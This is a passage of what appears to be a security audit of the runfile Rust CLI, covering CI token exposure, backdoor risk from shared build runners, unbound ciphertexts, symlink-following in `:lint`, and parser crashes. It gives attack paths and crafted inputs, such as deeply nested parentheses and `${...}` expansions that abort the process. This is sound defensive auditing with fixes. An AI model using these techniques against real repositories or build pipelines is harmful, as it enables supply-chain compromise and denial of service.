`crates/runfile-state/src/secret_service_store.rs:56-61`

```rust
pub(crate) fn is_usable() -> bool {
	match SecretService::connect(EncryptionType::Dh) {
		Ok(ss) => ss.get_default_collection().is_ok(),
		Err(_) => false,
	}
}
```

`crates/runfile-cli/src/cmd_env/mod.rs:72-87, 108-121`

```rust
key_hex = runfile_crypto::generate_key();
match keyring_keys::add(&key_hex) { ... }
...
println!("A new private key was generated and added to your local settings.");
```

`crates/runfile-cli/src/cmd_env/secret_keys.rs:76, 120-123`

```rust
"1" => runfile_crypto::generate_key(),
...
println!("Private key added.");
println!("  Stored in: OS credential store");
```

`crates/runfile-cli/src/cmd_env/crypt.rs:230-241, 340-350`

```rust
let new_key_hex = runfile_crypto::generate_key();
match keyring_keys::add(&new_key_hex) { ... }
...
if delete_current_key {
	match keyring_keys::remove(&old_public_key) {
```

**Attack path**

Data-loss path, no attacker. On a headless Linux host, an SSH session with no D-Bus session bus, WSL, a container, or a desktop session whose default collection cannot be resolved, is_usable() returns false and the process silently uses the linux-keyutils store (session keyring linked to the user's persistent keyring). `run :env init .env.production` (or `secret-keys add` -> 'Generate', or `rotate`) generates a key with OsRng and stores it only there; the CLI says the key was 'added to your local settings' / 'Stored in: OS credential store'. The user encrypts values and deletes the plaintext. Keys of the keyutils `user` type are kept entirely in kernel memory (keyrings(7)), so a reboot -- routine for WSL, whose VM shuts down when idle -- removes the key; after logout the persistent keyring expires after persistent_keyring_expiry (259200 s = 3 days on this machine) without access. `rotate --delete-current-key` deletes the old key from the same volatile store. From then on every value encrypted under the key fails with 'no matching private key'.

**Why existing controls don't stop it**

README.md:1070 says 'Secret Service with a keyutils fallback' without saying it is lost on reboot; the volatility is acknowledged only in a code comment. The init message suggests `get-private` for sharing with teammates, which would double as a backup if the user happened to do it, but nothing says it is necessary. No warning names the backend in use; `secret-keys list` prints '(secure: OS credential store)' regardless. Not exercised here: the audit rules forbid touching the real keyrings, so the backend choice and the volatility are traced through code, the vendored linux-keyutils-keyring-store 1.0.0 docs ('a reboot clears all keyrings'), and the man pages below.

**Impact**

Permanent loss of the decryption key, and with it every secret encrypted under it in every repository that used it, unless the user exported the key separately. Exposed users: WSL, remote dev boxes, servers. Some secrets can be re-issued upstream; others (generated signing keys, credentials whose only copy was the .env) cannot.

**Fix**

Expose the selected backend from keyring_store (e.g. `backend() -> Backend::{SecretService, Keyutils, Native}`). When it is keyutils: refuse to generate or store a key unless the user passes an explicit `--volatile` (or similar), or print the new private key once with a warning that it is held in kernel memory only and must be saved elsewhere; label it in `secret-keys list`; and never let `rotate --delete-current-key` remove the old key while the new one exists only in keyutils.

**⚠ Product impact**

*Type:* `ux`

Headless/WSL users see a warning or must opt in before a key is generated into keyutils; CI is unaffected (it uses RUNFILE_PRIVATE_KEYS).

*Safer rollout:* Ship the warning first; make the opt-in mandatory in a later release.

**References**

- https://man7.org/linux/man-pages/man7/keyrings.7.html — user-type keys are kept entirely within kernel memory (retrieved 2026-10-03)
- https://man7.org/linux/man-pages/man7/persistent-keyring.7.html — persistent keyring is garbage collected when its expiry timer (persistent_keyring_expiry) fires (retrieved 2026-10-03)

---

#### SA-018: Gitea workflows declare no `permissions:` and keep actions/checkout's persisted job token, so third-party code in ordinary CI (unpinned vsce tree, tree-sitter-cli's binary download, build scripts) can rewrite the default update channel's published release

**Severity:** Medium | **Confidence:** Likely | **Category:** infrastructure | **CWE-250** | **Component:** `.cicd/ci.yml, .cicd/release.yml, .cicd/audit.yml (Gitea Actions on the self-hosted fleet)`

**Location**

`.cicd/ci.yml:103-142`

```yaml
  extension:
    name: VS Code extension
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout repository
        uses: actions/checkout@v6.0.2
...
      - name: Install extension dependencies
        run: run vscode:setup
...
      - name: Set up the tree-sitter grammar
        run: run tree-sitter:setup
...
      - name: Compile and package extension
        run: run vscode:package
```

`.cicd/ci.yml:21-33`

```yaml
on:
  push:
    branches: [master]
  pull_request:
  workflow_dispatch:

jobs:
  check:
    name: Check
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout repository
        uses: actions/checkout@v6.0.2
```

`.cicd/release.yml:156-197`

```yaml
  extension:
    name: Package VS Code extension
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout repository
        uses: actions/checkout@v6.0.2
...
      - name: Install extension dependencies
        run: run vscode:setup

      - name: Compile and package extension
        run: run vscode:package --out="runfile-vscode-${TAG#v}.vsix"
```

`editors/tree-sitter/package.json:8-15`

```json
"devDependencies": {
	"tree-sitter-cli": "0.25.6"
},
"pnpm": {
	"onlyBuiltDependencies": [
		"tree-sitter-cli"
	]
}
```

**Attack path**

None of .cicd/ci.yml, .cicd/release.yml or .cicd/audit.yml has a `permissions:` key (grep finds none), so every job's GITEA_TOKEN takes the instance/owner/repository default -- which Gitea documents as Permissive, "read and write permissions for most units in the job's repository (backwards-compatible default)", where `contents` covers code and releases (job tokens before the 1.26 permission system were read/write on the repository too). actions/checkout@v6.0.2 runs first in every job with its defaults (persist-credentials: true; v6 stores the credential in a file under $RUNNER_TEMP wired into .git/config), so every later step running as the same user can read it. Later steps run third-party code: `run vscode:package` -> `npx @vscode/vsce` (unpinned tree, separate finding) on every push to master and every PR (ci.yml:142) and in releases; `run tree-sitter:setup` runs tree-sitter-cli's allowed install script, which downloads `tree-sitter-<platform>.gz` from GitHub releases and makes it executable with no checksum (ci.yml:136); `cargo build`/`clippy`/`test` run every dependency's build script and proc-macro; audit.yml runs `cargo install cargo-audit` (latest). Step by step: (1) one of those packages is (or becomes) malicious; (2) it runs during an ordinary CI run on the fleet -- no release needed; (3) it reads the persisted token and, while the job is alive, calls the Gitea API to delete and re-upload `install.sh`/`install.ps1`/archives on the newest published release (or pushes a tag/branch); (4) every README one-liner install and every `run :update` (default channel Gitea) then executes the replaced installer (see the release-integrity finding: nothing verifies it).

**Why existing controls don't stop it**

Only the owner opens PRs on Gitea (00-project-map.md), which removes fork-PR attackers but not dependency compromise, the realistic path here. Gitea forces read-only tokens only for fork PRs. pnpm 12 blocks dependency build scripts except those allowed, and tree-sitter-cli is explicitly allowed (editors/tree-sitter/package.json, pnpm-workspace.yaml allowBuilds). The token is short-lived (job lifetime), which an automated payload does not need to exceed. The fleet's runner VMs (gitea-ubuntu-26, gitea-macos-tah) run on the owner's workstation; VM isolation limits host damage but not what the token can do on the Gitea server. Not visible from the repository: the Gitea version, and whether the owner set the Restricted default or a maximum token permission in Settings -> Actions -> General (if set, this finding does not apply as written). GitHub's mirror workflows have the same missing top-level `permissions:` on several jobs, but that repository was created 2026-03-25 by a personal account (read-only default) and its releases are immutable, so it is a hardening note there.

**Impact**

A compromise of any build/test-time dependency becomes a persistent compromise of the default distribution channel (installers and `run :update` for every standalone install), without a release being cut and without the owner's credentials.

**Fix**

Add `permissions:\n  contents: read` at the top of .cicd/ci.yml and .cicd/audit.yml and of .cicd/release.yml, granting nothing extra to any job (the publish step already passes an explicit `secrets.GITEA_TOKEN` to gitea-release; if it relies on the job token, grant `contents: write` to the `release` job only). Add `with: persist-credentials: false` to every actions/checkout (no step pushes). In Gitea, set the owner/repository default token mode to Restricted and a maximum token permission. Pin vsce (separate finding) and consider running `tree-sitter:setup` without the binary download (or verifying it) since it only serves tests.

**Product impact:** none — internal change only.

**References**

- https://docs.gitea.com/usage/actions/token-permissions/ — Permissive = read and write for most units (backwards-compatible default); contents applies to code and releases; fork PRs always read-only; `permissions:` honoured (retrieved 2026-10-03)
- https://github.com/actions/checkout/blob/v6.0.2/action.yml — persist-credentials default true (retrieved 2026-10-03)
- https://github.com/actions/checkout/blob/v6.0.2/README.md — v6 stores credentials in a separate file under $RUNNER_TEMP; git commands keep working (retrieved 2026-10-03)
- https://raw.githubusercontent.com/tree-sitter/tree-sitter/v0.25.6/cli/npm/install.js — install script downloads the CLI binary from GitHub releases with no checksum verification (retrieved 2026-10-03)
- https://docs.gitea.com/api/operations/repo-delete-release-attachment/ — release attachments can be deleted via API (retrieved 2026-10-03)

---

#### SA-019: Gitea release binaries for the default update channel are built on persistent, shared host-mode runners whose $HOME (rustup toolchains, ~/.cargo) survives between jobs of every project on the fleet, so a compromised dependency in any job can backdoor later releases

**Severity:** Medium | **Confidence:** Likely | **Category:** supply-chain | **CWE-829** | **Component:** `.cicd/release.yml build matrix (macos-26, windows-2025) on the self-hosted Gitea fleet`

**Location**

`.cicd/release.yml:54-72, 89-94, 114-118`

```yaml
  build:
    runs-on: ${{ matrix.platform.runner }}
    ...
          - runner: macos-26
            target: aarch64-apple-darwin
          - runner: windows-2025
            target: aarch64-pc-windows-msvc
          ...
      - name: Rust toolchain
        uses: https://git.joaoverona.com/joaaoverona/shared-actions/rust-toolchain-and-cache@v1
        with:
          cache: false
      ...
      - name: Build release binary
        run: run ci:build
```

`.cicd/ci.yml:76-82`

```yaml
# rustup settles a Windows machine's host ABI once, when it is installed,
# and settles on GNU if Visual Studio was not there yet ... Naming the MSVC host takes the runner's history out of it
```

`.github/actions/setup/action.yml:43-49`

```yaml
# Gitea's act runner derives both from Go's own runtime whenever a job runs in host mode — which is how
# every macOS job runs, since macOS containers do not exist
```

`(outside repo) shared-actions/rust-toolchain-and-cache/action.yml @ local clone 0793d4f, consumed as @v1 by every Gitea job here:16-18, 140-141`

```
2. Its key hashes `rustup toolchain list` — machine state, on shared persistent runners.
   One re-run of an unchanged commit twenty minutes later had already moved it, because
   three unrelated toolchains had been installed by another project.
...
# The repository is part of the path because $HOME persists between jobs on these
# runners and is shared by every project that lands on one.
```

**Attack path**

Attacker: a compromised third-party package (npm, crates.io, a CI action) that gets executed by ANY job, of ANY of the owner's projects, scheduled on the fleet's macOS or Windows runner. These runners run jobs in host mode (no container), and the owner's own shared action documents that their $HOME persists between jobs and is shared by every project that lands on them (gitea-easy-runners' README says the same of persistent host-mode runners: "The workspace is cleaned between jobs; $HOME is not"). Steps: (1) a build script, proc-macro, npm install script or action in some unrelated job on, say, the windows-2025 runner writes %USERPROFILE%\.cargo\config.toml with `[target.x86_64-pc-windows-msvc] linker = <its own wrapper>` (or appends to rustflags, which Cargo joins across config files), or replaces a binary under ~/.rustup/toolchains/1.94.1-*/ or the ~/.cargo/bin proxies, or drops a .cargo/config.toml in a parent directory of the runner's work tree, which Cargo also probes; (2) the next `v*.*.*` tag push schedules .cicd/release.yml's build legs for aarch64/x86_64-apple-darwin on macos-26 and aarch64/x86_64-pc-windows-msvc on windows-2025; (3) setup-rust-toolchain finds toolchain 1.94.1 already installed and reuses it (rustup does not re-verify installed toolchains), and `run ci:build` (`cargo build --locked --release`) runs the planted linker/rustc, which injects code into run / run.exe; (4) the archives are uploaded, the Gitea release's sha256.sum is computed from them by the same pipeline, and every README one-liner install and every `run :update` (default channel Gitea) on macOS and Windows installs the backdoored binary. No token, no release-API access and no repository write is needed, so this is independent of the job-token finding.

**Why existing controls don't stop it**

`cache: false` on the release legs only skips restoring the target/ cache; it does not reset the toolchain, CARGO_HOME or RUSTUP_HOME. `--locked` pins crate versions, not the compiler, linker or $CARGO_HOME/config.toml. The act_runner cache server scopes caches by repository, so this is not cache poisoning, and it does not help. Only the owner opens PRs on Gitea, but the attacker here is a dependency, not a PR author. The fleet supports `--mode=ephemeral` (one job, then the machine is shut down for a host supervisor to revert the disk), which would defeat this; which mode the macos-26 and windows-2025 runners are registered with is per-machine config that is not in this repository or in gitea-easy-runners, so it could not be checked. The evidence that they are persistent is the owner's own shared action (comments at lines 16-18 and 140-141 above) and .cicd/ci.yml's remark about 'the runner's history'. Linux legs run in container mode, where $HOME is per job; the fleet README notes that the Docker socket is mounted into job containers and that what a job does through it outlives the job, which could give the Linux legs a similar path (not traced further). The GitHub mirror's release builds the same tags independently on ephemeral GitHub-hosted runners, so its archives would not carry the implant, but nothing compares the two.

**Impact**

Code execution as the installing user on every macOS and Windows machine that installs or updates from the default (Gitea) channel after a release cut while a planted toolchain is present. A compromise of any package that any project on the fleet builds becomes a compromise of runfile's releases, with nothing in the release pipeline able to notice.

**Fix**

Cheapest: in .cicd/release.yml's build job, give each run a fresh toolchain home before the Rust toolchain step, e.g. `env: CARGO_HOME: ${{ runner.temp }}/cargo, RUSTUP_HOME: ${{ runner.temp }}/rustup` at job level (setup-rust-toolchain then installs 1.94.1 fresh from static.rust-lang.org, whose manifest hashes rustup checks), and remove or do not trust any `.cargo/config.toml` above the workspace (`CARGO_HOME` alone does not stop parent-directory probing; building from a checkout under $RUNNER_TEMP or asserting `cargo config get` output is empty except the repo's own keys does). Better: register the macOS and Windows runners that take release jobs with `--mode=ephemeral` (the fleet already supports it), or give release jobs a label only dedicated, ephemeral runners carry. Detection: make the builds reproducible (`--remap-path-prefix` for $CARGO_HOME and the workspace, which differ between hosts) and compare each archive's binary hash between the Gitea release and the GitHub mirror's independent build of the same tag before `run mirror` or before publishing; a mismatch means one side was tampered with.

**Product impact:** none — internal change only.

**References**

- https://doc.rust-lang.org/cargo/reference/config.html — Cargo probes .cargo/config.toml in every parent directory and $CARGO_HOME/config.toml; arrays are joined across files; target.<triple>.linker overrides the linker (retrieved 2026-10-03)
- https://docs.gitea.com/runner/2/cache/ — runner cache entries are scoped by repository (so caches are not the vector) (retrieved 2026-10-03)
- https://api.github.com/repos/actions-rust-lang/setup-rust-toolchain/git/ref/tags/v1.16.1 — the toolchain action both forges use; it installs via rustup, which reuses an installed toolchain (retrieved 2026-10-03)

---

### Low

#### SA-020: Encrypted values are not bound to their variable name or file (AES-256-GCM with no associated data): a ciphertext moved to another variable or file still decrypts

**Severity:** Low | **Confidence:** Confirmed | **Category:** crypto | **CWE-345** | **Component:** `crates/runfile-crypto`

**Location**

`crates/runfile-crypto/src/lib.rs:64-78`

```rust
let nonce = Aes256Gcm::generate_nonce(OsRng);
let ciphertext = cipher
	.encrypt(&nonce, plaintext.as_bytes())
```

`crates/runfile-crypto/src/lib.rs:98-106`

```rust
let (nonce_bytes, ciphertext) = payload.split_at(NONCE_SIZE);
...
cipher
	.decrypt(nonce, ciphertext)
```

**Attack path**

Someone who can change a committed encrypted .env (a contributor's PR, a compromised bot account, anyone with write access) moves the ciphertext of DEPLOY_TOKEN into a variable the project prints or sends somewhere (e.g. `APP_VERSION=encrypted:<DEPLOY_TOKEN ciphertext>` where CI echoes the version), or copies production ciphertexts into the staging file encrypted under the same key. Reviewers cannot read ciphertext, so the diff is an opaque value change; GCM verifies it as authentic, and nothing ties it to the name it was encrypted for. The same property is what lets the decryption-oracle finding decrypt DB_PASSWORD's ciphertext as PR_TITLE (reproduced there).

**Why existing controls don't stop it**

Requires write access to the file and a sink that reveals the variable. The GCM tag authenticates the content only. Nonces are 96-bit from OsRng (rand_core 0.6 / getrandom), so no nonce-reuse issue; aes-gcm 0.10.3 is the release that fixed RUSTSEC-2023-0096 / CVE-2023-42811 (affected >=0.10.0,<0.10.3).

**Impact**

Disclosure or misuse of a secret through a change that looks routine in review. Low.

**Fix**

Encrypt with `aead::Payload { msg, aad }`, aad = a versioned context such as `runfile:v2\0<VARIABLE NAME>` (optionally plus the public-key fingerprint); write a new prefix (`encrypted:v2:`) so existing values still decrypt; have `:env rotate` upgrade files. decrypt_env_values passes the variable name it is decrypting.

**⚠ Product impact**

*Type:* `data-migration`

Existing values stay v1 until rotated or re-set; afterwards renaming a variable requires re-encrypting it.

*Safer rollout:* Accept v1 indefinitely (or with a warning) and upgrade on `rotate`/`set`.

**References**

- https://rustsec.org/advisories/RUSTSEC-2023-0096.html — aes-gcm >=0.10.0,<0.10.3 affected; 0.10.3 (in Cargo.lock) patched (retrieved 2026-10-03)

---

#### SA-021: `run :lint` follows symlinks out of the tree it was given -- a `.run` symlink is rewritten through the link, and a directory walk descends into symlinked directories, node_modules and .git

**Severity:** Low | **Confidence:** Confirmed | **Category:** data-loss | **CWE-59** | **Component:** `crates/runfile-cli, crates/runfile-discovery`

**Location**

`crates/runfile-cli/src/cmd_lint.rs:219-230`

```rust
match std::fs::write(file, &out) {
		Ok(()) => { report.note(file, "formatted"); ... }  // writes THROUGH a symlink, truncating the target; not atomic
```

`crates/runfile-discovery/src/lib.rs:448-456`

```rust
for p in entries {
		if p.is_dir() { ... }
		if p.extension().is_none_or(|x| x != "run") { continue; }  // a symlink named *.run is accepted as a target; no symlink_metadata / is_file check
```

`crates/runfile-cli/src/cmd_lint.rs:127-137`

```rust
fn walk(dir: &Path, out: &mut Vec<PathBuf>) {
	let Ok(rd) = std::fs::read_dir(dir) else { return };
	for e in rd.flatten() {
		let p = e.path();
		if p.is_dir() { walk(&p, out); }   // is_dir() follows symlinks; no visited set, no skip list
		else if p.extension().is_some_and(|x| x == "run") { out.push(p); }
	}
}
```

`crates/runfile-cli/src/cmd_lint.rs:110-125`

```rust
pub fn from_paths(paths: &[String]) -> Result<Vec<PathBuf>, String> {
	...if p.is_dir() { walk(&p, &mut out); } else if p.is_file() { out.push(p); } ...
}
```

**Attack path**

Discovery registers any entry whose extension is `run` as a target, without checking it is a regular file (walk_runs, lib.rs:453 -- extension and is_dir only). git stores symlinks (mode 120000), so a repository can ship `runfiles/build.run` as a symlink to a file OUTSIDE the repo. `run :lint` -- run by a developer on the repo and by the committed pre-commit hook (`run precommit` / `run check`) -- formats every discovered target: shape() reads the file, and if it parses as a runfile and is not already formatted, calls std::fs::write(file, &out) (cmd_lint.rs:219). std::fs::write follows the symlink and truncates+rewrites the TARGET, so the outside file's contents are replaced with the formatted runfile and the symlink is left in place. Reproduced on the HEAD debug binary: `runfiles/build.run -> ../outside/victim.run`; `run :lint` reported `runfiles/build.run: formatted` and rewrote ../outside/victim.run from its blank-padded form to the formatted `$ true`, with the symlink preserved.

[Also reported by `cli`] `run :lint <dir>` expands a directory argument with walk(), which recurses into every entry for which Path::is_dir() is true. is_dir() follows symlinks and there is no visited-inode set and no skip list. A symlink inside the walked tree that points outside it (e.g. sneaky -> ~/other-project) causes :lint to discover and, by default, format/rewrite .run files outside the directory the user named -- the walk is not confined to the given root. A symlink loop (a/up -> ..) is re-entered until the kernel's symlink-chain limit (ELOOP, ~40) stops it: confirmed by experiment, `run :lint <loopdir>` reported '41 files checked' for a single real x.run, i.e. ~40x redundant reads/writes of the same file rather than a hard failure. The walk also descends into node_modules/.git/target (which discovery deliberately skips), reading any stray .run files there.

**Why existing controls don't stop it**

No file-type guard in discovery (no symlink_metadata / is_file -- lib.rs:453) and none in cmd_lint before writing. The formatter's parse+fingerprint check (format re-parses and compares) limits the DAMAGE to files that are valid runfile syntax: a symlink to /etc/passwd or ~/.bashrc does not parse, so shape() returns Some(src) and leaves it untouched (cmd_lint.rs:198) -- so this cannot corrupt arbitrary content, only reformat files that already are (or happen to be) valid runfiles (e.g. another project's or ~/.runfiles/ .run files). The write is NOT atomic (truncate-in-place, no temp+rename), so an interrupt/crash mid-write can leave the target truncated. File permissions of the target are preserved only incidentally (write keeps the existing mode). The user does run :lint deliberately, which caps severity at low; but the file modified is outside the project they think they are linting, and pre-commit makes it semi-automatic.

[Also reported by `cli`] Unlike runfile-discovery (which caps depth at 3 and skips node_modules/target/dist/build/.git/vendor), cmd_lint::walk has neither a skip list, a depth cap, a visited set, nor a symlink_metadata()/is_file() check, and no canonicalize+prefix confinement to the named root. The kernel ELOOP limit bounds the loop case to ~40x work (so not an unbounded DoS), but the out-of-root rewrite is real. It is user-initiated on a directory the user chose, which keeps it defense-in-depth rather than a direct attack: a user running `run :lint .` in an untrusted checkout, trusting it to stay inside the checkout, would have .run files reached via symlinks rewritten.

**Impact**

A repository can cause `run :lint` (including the pre-commit/pre-push hooks) to reformat -- and, on an interrupted write, truncate -- a valid `.run` file outside the repository, chosen by the repo author via a committed symlink. Confined to files that parse as runfiles, so it reformats rather than arbitrarily overwrites; the integrity concern is modification of an out-of-tree file the user did not intend to touch.

[Also reported by `cli`] In-place reformatting of .run files outside the directory the user asked to lint (reached via symlinks), and up to ~40x redundant work when a symlink loop is present. No code execution.

**Fix**

Reject non-regular-file `.run` entries in discovery (classify with symlink_metadata and skip symlinks / FIFOs / devices) -- the same guard the symlink-walk and read_to_string findings call for -- so a symlinked target is never linted. If symlinked targets must stay supported, have :lint refuse to write when file.symlink_metadata() reports a symlink (format to stdout instead), and write atomically via a temp file + rename within the same directory.

[Also reported by `cli`] In walk(): use e.file_type() (which does not follow symlinks) and skip symlinks and the usual ignore list (node_modules, target, dist, build, .git, vendor); cap depth; and confine results to the canonicalized root. Mirror runfile-discovery's existing walk policy so the two agree.

**⚠ Product impact**

*Type:* `behavior`

A project that deliberately symlinks a .run file into runfiles/ from elsewhere would no longer have that target linted (or would have it printed rather than written). Unusual; no shipped runfile relies on it.

*Safer rollout:* Skip symlinked targets for writing and report them, rather than hard-failing discovery.

**References**

- https://cwe.mitre.org/data/definitions/59.html — CWE-59 Improper Link Resolution Before File Access (symlink following) (retrieved 2026-10-03)

*Reported independently by 2 agents: cli, untrusted-repo.*

---

#### SA-022: A crafted `.run` file aborts every read-only entry point (`:list`, Tab, `--help`, `:lint`, the language server): unbounded recursion in the parser and the shell word reader, and byte slicing at non-char boundaries

**Severity:** Low | **Confidence:** Confirmed | **Category:** dos | **CWE-674** | **Component:** `crates/runfile-lsp`

**Location**

`crates/runfile-lang/src/parser.rs:1620-1627`

```rust
Token::Punct("(") => {
	self.i += 1;
	let e = self.chain()?;   // chain -> or -> and -> cmp -> add -> mul -> unary -> postfix -> primary -> chain : unbounded recursion, one frame per nesting level
	if !self.eat(")") {
		return err(self.line, "expected `)`");
	}
	Ok(e)
}
```

`crates/runfile-lang/src/parser.rs:256-262`

```rust
fn block_of(&mut self, kw: Option<&str>, branches: bool) -> Result<Block, ParseError> {
	let mut b = Block::default();  // block -> statement -> block for every nested if/for/match: one frame per level, no depth cap
```

`crates/runfile-lsp/src/server.rs:129-135`

```rust
fn diagnostics_for(&self, uri: &str) -> Value {
	let src = self.docs.get(uri).map(String::as_str).unwrap_or_default();
	... crate::document::diagnostics(src, path.as_deref(), cat.as_ref(), &|p| self.text_of(p));
```

`crates/runfile-lsp/src/analysis.rs:87-100`

```rust
pub fn diagnose(src: &str, ...) -> Vec<Diagnostic> {
	let ast = match runfile_lang::parse(src) {   // recursive-descent parse of attacker-controlled text
```

`crates/runfile-lang/src/parser.rs:1620-1626`

```rust
Token::Punct("(") => {
	self.i += 1;
	let e = self.chain()?;
	if !self.eat(")") {
		return err(self.line, "expected `)`");
	}
	Ok(e)
}
```

`crates/runfile-lang/src/parser.rs:1600-1618`

```rust
Token::Punct("[") => {
	self.i += 1;
	let mut items = Vec::new();
	if !self.eat("]") {
		loop {
			items.push(self.chain()?);  // chain() recurses to primary() for each nested [ or (
...
```

`crates/runfile-lang/src/parser.rs:250-296`

```rust
fn block_of(&mut self, kw: Option<&str>, branches: bool) -> Result<Block, ParseError> {
	...
	let mut st = if branches { self.branch_statement()? } else { self.statement()? };
	// statement() -> if_tail()/loop_body()/exec_block() -> block() with no depth cap
```

`crates/runfile-lang/src/parser.rs:1416-1420`

```rust
if e.i != e.t.len() {
	return err(
		line,
		format!("trailing tokens after expression: `{}`", &s[..s.len().min(60)]),
	);
```

`crates/runfile-lang/src/parser.rs:911-921`

```rust
let base = raw
	.iter()
	.filter(|l| !l.trimmed.is_empty())
	.map(|l| l.indent.len())
	.min()
	.unwrap_or(0);
...
let text = if l.raw.len() >= base { &l.raw[base..] } else { "" };
```

`crates/runfile-lang/src/format.rs:273-282`

```rust
let base = body
	.iter()
	.filter(|l| !l.trim().is_empty())
	.map(|l| l.len() - l.trim_start().len())
	.min()
	.unwrap_or(0);
let dedented: Vec<&str> = body
	.iter()
	.map(|l| if l.len() >= base { &l[base..] } else { "" })
```

`crates/runfile-cli/src/list.rs:98-104`

```rust
pub fn names(cat: &Catalog) -> Vec<String> {
	cat.targets
		.values()
		.filter(|t| !facts(t).hidden)   // facts() parses the whole file; `hidden` only needs the name
```

`crates/runfile-shell/src/words.rs:363-412`

```rust
fn parameter(&mut self, parts: &mut Vec<Part>, i: usize) -> R<()> {
	...
	loop {
		...
		match ch.c {
			...
			'$' => self.dollar(parts, Quote::Opaque)?,  // -> dollar() -> parameter() with no depth cap
```

`crates/runfile-shell/src/words.rs:278-281`

```rust
Some('{') => {
	self.i += 2;
	self.parameter(parts, i)?;  // ${...} opens another parameter level
```

`crates/runfile-shell/src/syntax.rs:456-464`

```rust
fn command(&mut self, opener: Option<Opener>) -> R<Command> {
	self.depth += 1;
	if self.depth > 64 { return Err(Stop::Lost); }  // caps $(...) and <(...) nesting, but NOT word-level ${...}, $"..." or [[ ]] cond
```

**Attack path**

A repository ships a runfiles/*.run (or _shared.run) file containing a deeply nested expression or block -- e.g. `print(` + `(`*5000 + `1` + `)`*5000 + `)`, or `[`*3000...`]`*3000, or ~5000 nested `if true`/`end`, or a ~20000-arm `else if` chain. runfile-lang's parser is plain recursive descent: `chain -> or -> ... -> primary -> chain` recurses once per parenthesis/bracket level (parser.rs:1620-1627, 1600-1618, 1526 unary), and `block_of -> statement -> block_of` recurses once per nested block (parser.rs:256, 463/492/562/580/606, if_tail 661-668). There is no depth limit anywhere. A Rust stack overflow is an immediate `abort()` -- it cannot be caught by catch_unwind, and the binary installs none anyway -- so the whole process dies with SIGABRT. This parse runs with NO intent to execute: the language server (`run :lsp`) parses the document on every textDocument/didOpen and didChange (server.rs:67,79 -> document::diagnostics -> runfile_lang::parse), so merely opening the file in an editor crashes the server; completion also parses via analysis::parse_around. The same parse backs every read-only CLI path the project map marks 'must not execute': `run :list` / `:list --json` (auto-run by the VS Code extension on folder open), `run :complete` (fired on every shell <Tab>), `run <t> --help`, `run :lint`, `run --dry-run`. Confirmed on both the debug build and the installed release binary 1.8.2: `run :lsp` over stdio aborts (`thread 'main' has overflowed its stack; fatal runtime error: stack overflow, aborting`) on didOpen of a 10 KB file; `run --dir <repo> :list` and `:complete 1 run` abort (exit 134) the same way. Release thresholds measured: ~5000 nested parens (10 KB), ~5000 nested if-blocks (60 KB), ~20000-arm else-if chain. A sibling crash also reaches the LSP indirectly: a deeply nested runfiles/_shared.run crashes the server when ANY sibling file is opened (the shared chain is parsed too, document.rs:41-44) -- confirmed.

[Also reported by `lang-parser`] Source: any .run file in a cloned repository that the discovery walk reaches (the nearest runfiles/ up the tree, plus */runfiles/ down to depth 3, plus the machine-wide dir). The recursive-descent expression parser climbs the whole precedence chain (chain -> or -> and -> cmp -> add -> mul -> unary -> postfix -> primary) and primary() recurses back into chain() for every `(` group (parser.rs:1620) and every `[` list element (parser.rs:1600); block assembly recurses block()->statement()->if_tail()/loop_body()->block() for every nested block. None of these paths carries a depth counter. A tiny file -- `let x = ` followed by ~800 `(`, or ~700 `[`, or `if true`/`end` nested ~500 deep -- drives the recursion past the 8 MB main-thread stack guard page. Reached with no intent to execute anything: `run :list` and `run :list --json` (the VS Code extension runs the latter on startup) and `run :complete <cword> run...` (every `run <Tab>`) parse EVERY target file via list::facts(); `run <t> --help`, `run :lint`, `run :generate` and the language server (`run :lsp`, single-threaded on the main thread, no catch_unwind) all parse too. Sink: Rust hits the stack guard page and aborts (SIGABRT/SIGSEGV, exit 134).

[Also reported by `lang-parser`] Source: a .run file in a cloned repository (any runfiles/ dir the discovery walk reaches, including subprojects up to depth 3). Two triggers: (1) an expression followed by trailing tokens whose 60th byte falls inside a multi-byte character, e.g. `let x = 1 "` + 40 x `é` + `"` -- parse_expr builds its error message with &s[..60] and panics; (2) an exec/json body whose lines are indented with Unicode whitespace of different byte widths, e.g. `exec cat` / `\tx` / `\u3000y` / `end` -- `scan_lines` computes indentation with str::trim_start (Unicode White_Space), exec_body takes the minimum indent *byte length* (1) and slices `&l.raw[1..]` inside the 3-byte U+3000. Entry points that parse without the user asking to run anything: `run :complete` (every `run <Tab>`: list::names -> facts() -> runfile_lang::parse for EVERY target, only to compute `hidden`, which depends on the name alone), `run :list` / `run :list --json` (run automatically by the VS Code extension on startup), `run <t> --help`, `run :lint`, `run :generate`, and the language server (`run :lsp`) on textDocument/didOpen. Sink: Rust panic -> process exits 101.

[Also reported by `shell-checker`] Source: any .run file whose `$` lines (or `exec` shell bodies) the checker reads -- bash by default, or whatever `.shell` names. A single shell line `$ echo ${x+${x+${x+ ... }}}` nests parameter expansions; words::parameter() loops over the body and, on an inner `$`, calls words::dollar() which calls parameter() again (words.rs:278-281, 363-412), with no depth counter. The command()-level depth-64 cap in syntax.rs:456 guards only $(...) and <(...) (which recurse through command()), not the word reader, so ${...} nesting is unbounded. The shell checker runs in runfile_runtime Host::load (before EVERY `run`, including `run --dry-run`), in `run :lint`, and in the language server's analysis::diagnose on open/edit (single-threaded, no catch_unwind). Sink: stack guard-page hit -> abort (exit 134). A second vector, the bash `[[ ... ]]` conditional grammar (syntax.rs Cond::or/and right-recursion), overflows on a single line with ~60000 `||` operators.

**Why existing controls don't stop it**

No recursion-depth limit in parser.rs (grep: no depth counter on block_of/chain/primary/unary). No catch_unwind in the CLI or the LSP (main.rs:75 installs only an interrupt handler and a broken-pipe guard), and a stack overflow aborts regardless of panic strategy, so no unwind guard could help. The LSP's serve() loop (server.rs:31-48) only recovers from ReadError, not from a worker abort. The VS Code client restarts a crashed server a few times and then falls back / gives up (editors/vscode/src/lsp.ts on('exit')). Distinct from the already-filed root causes: lang-parser's non-ASCII byte-boundary panic (different mechanism), shell-checker's exponential nested-loop walk (hang, not abort; needs 25+ levels), runtime's in-process `run` dispatch recursion (runtime recursion, needs a dispatch cycle), and lang-eval's serde_json deep-nesting (checked clean, has a serde recursion limit). None of those caps the parser's own recursion.

